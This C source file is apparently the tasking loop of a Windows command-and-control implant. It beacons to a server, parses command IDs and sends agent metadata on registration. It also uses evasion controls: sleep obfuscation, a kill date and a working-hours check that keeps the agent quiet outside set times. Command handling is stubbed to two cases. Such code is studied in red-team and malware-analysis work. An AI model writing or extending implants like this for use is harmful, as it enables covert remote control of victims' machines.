#include "TaskController.h"
#include "SleepObfMain.h"


void TaskingRoutine() {

    PARSER   Parser = { 0 };
    pDataBuffer   Buffer = { 0 };
    SIZE_T   DataBufferSize = { 0 };
    PARSER   TaskParser = { 0 };
    LPVOID   TaskBuffer = { 0 };
    UINT32   TaskBufferSize = { 0 };
    UINT32   CommandID = { 0 };
    UINT32   RequestID = { 0 };
	AgentCMD AgentCMD = { 0 };


    while (TRUE) {
        if (!agent->session->Active)
            break;
        
        PerformSleepObf();

        if (ReachedKillDate()) {
            printf("[info] Kill date reached, exiting agent.\n");
            exit(-1);
        }

        if (!InWorkingHours())
        {
            continue;
        }

        //TODO perform package sending request. that will send all open packages and receive any responses from the server for commands to execute.
        if (!PackageSendAll(Buffer, &DataBufferSize))
        {
            break;
        }
        
		if (Buffer && Buffer->BufferLength > 0) { // if we successfully sent our queued packages and received a response.

            NewParser(&Parser, Buffer->Buffer, Buffer->BufferLength);
            AgentCMD.CommandID = ParserReadInt32(&Parser);
            AgentCMD.RequestID = ParserReadInt32(&Parser);

            switch (AgentCMD.CommandID) {
            case NO_JOB:
                break;

            case REGISTER_AGENT:
                PackageSendMetaDataPackage(agent->MetaDataPackage, NULL, NULL);
                break;

            default:
                break;
            }
        }
        else // we did not rececive a response from the server server is down or we have no connectivity.
        { 
			break;
        }

		
    }

    agent->session->Active = FALSE;

}


BOOL ReachedKillDate() {
	UINT64 CurrentTime = 0;
    CurrentTime = GetUnixTime();
    if (CurrentTime >= agent->config->KillDate) {
        return TRUE;
    }
	return FALSE;
}

BOOL InWorkingHours() {
	SYSTEMTIME SystemTime = { 0 };
	UINT32 WorkingHours = agent->config->WorkingHours;
    WORD StartHour = 0;
    WORD StartMinute = 0;
    WORD EndHour = 0;
    WORD EndMinute = 0;

	//if working hours not set return true as we're always in working hours.
    if (((WorkingHours >> 22) & 1) == 0)
        return TRUE;

    StartHour = (WorkingHours >> 17) & 0b011111;
    StartMinute = (WorkingHours >> 11) & 0b111111;
    EndHour = (WorkingHours >> 6) & 0b011111;
    EndMinute = (WorkingHours >> 0) & 0b111111;

	agent->apis->pGetLocalTime(&SystemTime);

	if (SystemTime.wHour < StartHour || SystemTime.wHour > EndHour)
		return FALSE;
	if (SystemTime.wHour == StartHour && SystemTime.wMinute < StartMinute)
		return FALSE;
	if (SystemTime.wHour == EndHour && SystemTime.wMinute > EndMinute)
		return FALSE;

	return TRUE;
}